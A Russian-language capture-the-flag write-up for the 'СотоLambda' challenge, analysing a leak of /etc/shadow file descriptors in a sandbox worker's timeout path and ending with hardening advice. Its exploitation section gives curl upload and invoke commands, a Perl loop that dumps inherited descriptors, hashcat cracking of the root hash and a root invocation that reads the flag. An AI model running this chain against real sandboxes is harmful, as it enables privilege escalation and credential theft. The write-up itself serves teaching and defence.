# СотоLambda — технический разбор

**Флаг:** `avito{Ea5Y_fIL3_DE5CrIP70R_l3ak}`
**Класс:** Reverse Engineering · Linux · file descriptor leak · privilege escalation

## Краткое техническое резюме

Привилегированный worker открывает `/etc/shadow` без `O_CLOEXEC` при аутентификации каждого запроса.
В timeout path управление возвращается через `SIGALRM` и `siglongjmp`, минуя закрытие descriptor.
Утёкшие descriptors сохраняются в долгоживущем worker и наследуются следующими child processes после
`fork`, сброса UID и `execv`. Загруженный ELF читает уже открытый `/etc/shadow`, после чего слабый
DES-crypt hash root подбирается offline. Полученный пароль позволяет выполнить загруженный binary с
UID 0 и прочитать `/root/flag.txt`.

---

**Для воспроизведения:** Нужен работающий Linux-worker; timeout-запросы должны попадать в один долгоживущий процесс. `--self-test` проверяет генерацию ELF и DES-crypt на локальной фикстуре.

## 1. Контекст и цель

Сервис принимает Linux x86-64 ELF binaries, resource limits и timeout, после чего выполняет binary с
UID аутентифицированного пользователя. Доступны тестовые credentials `runner`/`runner` и
демонстрационный binary. Цель — прочитать `/root/flag.txt`, доступный только UID 0. Основной артефакт
для анализа — worker binary `sandbox_worker.elf`.

## 2. Разведка и поверхность атаки

Инстанс доступен по `https://elflambda-<id>.avitoctf.ru`. API предоставляет следующие endpoints:

- `GET /api/config` → `{"auth":{"login":"runner","password":"runner"}, ...}` — тестовые credentials.
- `GET /api/binaries` → засеянный `hello-world`; `POST /api/upload` (multipart `file`) →
  `{binary_id}` (загрузить свою программу).
- `POST /api/invoke {"binary_id","args","stdin","auth":{"login","password"},"sandbox_settings":
  {"memory_mb","timeout_ms"}}` → запустить программу, вернуть `{stdout,stderr,exit_code,timed_out,
  error}`.

**Reverse engineering `sandbox_worker.elf`.** Binary содержит symbols; основная логика находится в
`handle_request()`:

1. Читает одну строку JSON, разбирает поля (`login`, `password`, `binary`, `args`, `stdin`,
   `timeout_ms` ≤ 5000 ms, `memory_mb` ∈ [8, 256], `max_fds` ∈ [4, 1024]).
2. С UID 0 открывает `/etc/shadow` с `flags=0`, то есть без `O_CLOEXEC`, читает запись для
   `login`, отвергает заблокированные аккаунты и сверяет пароль через `crypt()`.
3. Ставит 4 лимита ресурсов (`rlimit`: CPU time, file size, address space и open file descriptors —
   но **нет** лимита на число процессов), устанавливает таймер через `setitimer` + `sigsetjmp`, создаёт
   три pipe и вызывает `fork()`.
4. В child process сбрасывает privileges до аутентифицированного пользователя
   (`setgroups` → `setresgid` → `setresuid`) и вызывает `execv(binary, argv)`. Environment parent
   process наследуется без фильтрации.

**Вывод reconnaissance:** sandbox реализует password check, resource limits и прямой `execv` на
файловой системе host. Seccomp, namespaces и chroot отсутствуют, поэтому валидные credentials дают
arbitrary code execution с UID соответствующего пользователя.

## 3. Анализ и проверка гипотез

`shell.elf` — 159-байтный ELF со статическим shellcode `execve("/bin/sh")`. Запуск под
`runner`/`runner` подтверждает arbitrary command execution с UID 1000, но DAC запрещает чтение
`/root/flag.txt`. Эксплуатации требуется privileged resource, который сохраняется после UID drop.

Static analysis и `strace -f` показывают различие в descriptor lifecycle. В success и error paths
descriptor `/etc/shadow` закрывается штатно. Обработчик `SIGALRM` выполняет `siglongjmp` в начало main
loop и освобождает только task pipes; shadow descriptor в этом control-flow path остаётся открытым.

**Проверка гипотезы.** После 30 invocations с гарантированным timeout
(`timeout_ms=1`, `stdin="sleep 3"`) число открытых descriptors worker выросло с 3 до 33. Каждый timeout
оставляет один открытый descriptor `/etc/shadow` в долгоживущем worker. Descriptors открыты с UID 0
без `O_CLOEXEC`; child process закрывает только descriptor текущего запроса. Ранее утёкшие descriptors
переживают `fork`, privilege drop и `execv`, поэтому становятся доступны загруженному binary.

**Чтение descriptor.** `cat /proc/self/fd/N` выполняет новый `open()` для `/etc/shadow` с UID `runner`
и получает `EACCES`. Требуется читать исходный open file description без повторного permission check.
В Perl операция `open(FH,"<&=$N")` привязывает filehandle к уже открытому descriptor без повторного
permission check. После password check его offset находится в EOF, поэтому перед `sysread` выполняется
`sysseek($F, 0, 0)`.

## 4. Корневая причина

Два комбинирующихся дефекта в `sandbox_worker.elf`:

1. **Файл с паролями открыт без `O_CLOEXEC`, и timeout path его не закрывает.** Процесс с UID 0 открывает
   `/etc/shadow` в начале каждого запроса и держит fd весь запрос. На путях «успех»/«ошибка» fd
   закрывается, но timeout path (`SIGALRM` → `siglongjmp` из handler в точку `sigsetjmp` main loop)
   закрывает только task pipes. Descriptor накапливается в постоянном worker process.

2. **Неограниченное наследование descriptors через `execv`.** Child process закрывает только shadow fd
   текущего запроса. Ранее утёкшие descriptors имеют другие номера и переживают `fork`, privilege drop
   и `execv`. Непривилегированный process начинает выполнение с доступом к open file description,
   созданному UID 0.

В результате resource leak превращается в disclosure `/etc/shadow` процессу с UID `runner`, после чего
становится возможен offline password cracking.

## 5. Эксплуатация

1. **Payload.** Собрать `shell.elf` (`mkelf.py`) — статический `execve("/bin/sh")`, читающий команды из
   унаследованного stdin. Загрузить:
   ```
   (cd sotolambda && uv run python mkelf.py)
   curl -F file=@sotolambda/shell.elf https://elflambda-<id>.avitoctf.ru/api/upload
   # -> {"binary_id": BID}
   ```
2. **Descriptor leak.** Выполнить около 50 запросов `/api/invoke` с гарантированным timeout под
   `runner`/`runner`:
   ```
   curl -X POST https://elflambda-<id>.avitoctf.ru/api/invoke -H 'Content-Type: application/json' \
     -d '{"binary_id":"BID","stdin":"sleep 3\n","auth":{"login":"runner","password":"runner"},
          "sandbox_settings":{"memory_mb":64,"timeout_ms":1}}'
   ```
   Число запросов должно оставаться ниже descriptor limit worker; иначе несвязанный crash
   `popen(...,"rb")` → `fileno(NULL)` перезапустит worker и удалит накопленное состояние.
3. **Чтение.** Обычный invocation получает Perl payload через `stdin`. Payload перебирает номера fd,
   привязывает к нему filehandle без повторного открытия target file, сбрасывает offset и выводит
   descriptor с форматом `/etc/shadow`:
   ```perl
   perl -e 'for my $n (3..200){
     open(my $F, "<&=" . $n) or next;
     my $pos = sysseek($F,0,0); next unless defined $pos;
     my $buf=""; my $r=sysread($F,$buf,65536);
     next unless $r && $buf =~ /:/;
     print "###FD".$n." len=".$r."\n".$buf; last; }'
   ```
   Payload отправляется через `/api/invoke` (`timeout_ms:1000`, `runner`/`runner`) и возвращает
   содержимое `/etc/shadow`.
4. **Offline password cracking.** Запись root не заблокирована: `root:azMuiLc/ZPwrM:...` — legacy
   DES-crypt hash с salt `az`. `hashcat -m 1500 root.hash rockyou.txt` даёт
   `azMuiLc/ZPwrM:mole` → пароль root = **`mole`**.
5. **Root.** `/api/invoke` с `auth:{"login":"root","password":"mole"}` проходит authentication;
   `setresuid(0,0,0)` сохраняет privileges, и `execv` запускает загруженный binary с UID 0:
   ```
   curl -X POST https://elflambda-<id>.avitoctf.ru/api/invoke -H 'Content-Type: application/json' \
     -d '{"binary_id":"BID","stdin":"cat /root/flag.txt\n",
          "auth":{"login":"root","password":"mole"},
          "sandbox_settings":{"memory_mb":64,"timeout_ms":2000}}'
   ```
   → `avito{Ea5Y_fIL3_DE5CrIP70R_l3ak}`.

Solver автоматизирует шаги 1–5: формирует ELF в памяти, загружает его, создаёт timeout conditions,
находит унаследованный shadow fd, проверяет DES-crypt по встроенному wordlist или параметру
`--wordlist` и читает flag:

```bash
uv run python sotolambda/solve_sotolambda.py --base https://elflambda-<id>.avitoctf.ru
```

## 6. Флаг

```
avito{Ea5Y_fIL3_DE5CrIP70R_l3ak}
```

## 7. Выводы и рекомендации

1. **DAC и rlimits не обеспечивают sandbox isolation.** Для запуска недоверенного кода требуются как
   минимум namespaces, seccomp, изолированная root filesystem и отдельная security boundary.

2. **Resource cleanup должен покрывать все control-flow paths.** Cleanup должен выполняться в success,
   error и asynchronous timeout paths. Privileged descriptors
   необходимо открывать с `O_CLOEXEC`; перед `execv` следует применять allowlist descriptors или
   `close_range`. Доступ к `/etc/shadow` должен быть локализован в минимальном auth component.

## 8. Файлы для воспроизведения

В репозитории:

- `solve_sotolambda.py` — основной end-to-end entry point для upload→fd leak→DES crack→root invoke.
  Быстрая локальная проверка ELF и хэша: `uv run python sotolambda/solve_sotolambda.py --self-test`.
- `mkelf.py` — генератор `shell.elf` (159-байтный статический `execve("/bin/sh")` payload).

Анализируемый worker binary не входит в набор файлов в Git. Ожидаемый локальный путь —
`sotolambda/sandbox_worker.elf`; файл остаётся ignored.
